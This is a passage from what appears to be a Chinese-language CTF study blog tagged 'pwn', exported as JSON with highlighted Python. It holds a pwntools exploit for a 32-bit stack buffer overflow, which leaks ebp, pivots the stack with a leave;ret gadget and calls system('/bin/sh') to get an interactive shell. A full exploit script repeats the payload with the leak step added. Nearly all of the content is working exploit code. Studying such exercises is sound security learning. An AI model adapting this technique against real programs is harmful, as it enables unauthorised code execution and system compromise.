class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">system = <span class=\"number\">0x8048400</span></span><br><span class=\"line\">leave_ret = <span class=\"number\">0x80485FD</span></span><br><span class=\"line\">offset = <span class=\"number\">0x38</span></span><br><span class=\"line\">input_addr = ebp - offset</span><br><span class=\"line\">shell = input_addr + <span class=\"number\">16</span></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;aaaa&#x27;</span> + p32(system) + <span class=\"string\">b&#x27;aaaa&#x27;</span> + p32(shell) + <span class=\"string\">b&#x27;/bin/sh\\x00\\x00&#x27;</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;1&#x27;</span> * (<span class=\"number\">0x28</span> - <span class=\"built_in\">len</span>(payload)) + p32(input_addr) + p32(leave_ret)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>完整exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">system = <span class=\"number\">0x8048400</span></span><br><span class=\"line\">leave_ret = <span class=\"number\">0x80485FD</span></span><br><span class=\"line\">offset = <span class=\"number\">0x38</span></span><br><span class=\"line\">overflow1 = <span class=\"string\">b&#x27;1&#x27;</span>*<span class=\"number\">0x28</span></span><br><span class=\"line\">sh.sendafter(<span class=\"string\">b&#x27;name?\\n&#x27;</span>,overflow1)</span><br><span class=\"line\">ebp = u32(sh.recvuntil(<span class=\"string\">b&#x27;\\xff&#x27;</span>)[-<span class=\"number\">4</span>:])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(ebp))</span><br><span class=\"line\">input_addr = ebp - offset</span><br><span class=\"line\">shell = input_addr + <span class=\"number\">16</span></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;aaaa&#x27;</span> + p32(system) + <span class=\"string\">b&#x27;aaaa&#x27;</span> + p32(shell) + <span class=\"string\">b&#x27;/bin/sh\\x00\\x00&#x27;</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;1&#x27;</span> * (<span class=\"number\">0x28</span> - <span class=\"built_in\">len</span>(payload)) + p32(input_addr) + p32(leave_ret)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n","categories":["学习笔记"],"tags":["pwn"]}]